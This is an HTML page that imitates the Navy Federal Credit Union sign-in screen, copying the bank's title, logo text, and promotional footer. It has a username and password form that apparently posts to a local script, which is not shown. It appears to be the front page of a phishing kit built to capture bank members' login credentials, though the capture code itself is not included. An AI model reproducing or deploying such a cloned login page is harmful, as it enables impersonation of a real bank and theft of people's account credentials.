<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <link rel="stylesheet" href="./css/main.css">
    <link rel="icon" type="image/png" sizes="32x32" href="./icon.png">
    <script src="https://kit.fontawesome.com/bcfb457481.js" crossorigin="anonymous"></script>
    <title>Navy Federal Credit Union | Banking, Loans, Mortgages & Credit Cards | Navy Federal Credit Union</title>
</head>
<body>
    <div id="container">
        <div id="logo">
            <img src="./logo.png">
            <h3>NAVY FEDERAL</h3>
        </div>
        <div id="main-body">
            <div class="greetings"></div>
            <form>
                <input name="username" id="username" type="text" placeholder="Username">
                <input name="password" id="password" type="password" placeholder="Password">
                <button type="submit">Sign In</button>
            </form>
            <div id="help">
                <h6>
                    <a href="#">SIGN IN HELP</a>
                </h6>
            </div>
        </div>
        <div id="social">
            <h4><i class="fa-solid fa-phone"></i> CONTACT</h4>
            <h4><i class="fa-solid fa-location-dot"></i> ATM/BRANCH</h4>       
        </div>
    </div>
    <div id="footer">
        <figure>
            <img src="./cards.jpg">
            <figcaption>Save With a Balance Transfer</figcaption>
        </figure>
        <figure>
            <img src="./govt-shutdown.jpg">
            <figcaption>Government Shutdown Assistance</figcaption>
        </figure>
    </div>
    <script src="./js/main.js"></script>
</body>
</html>
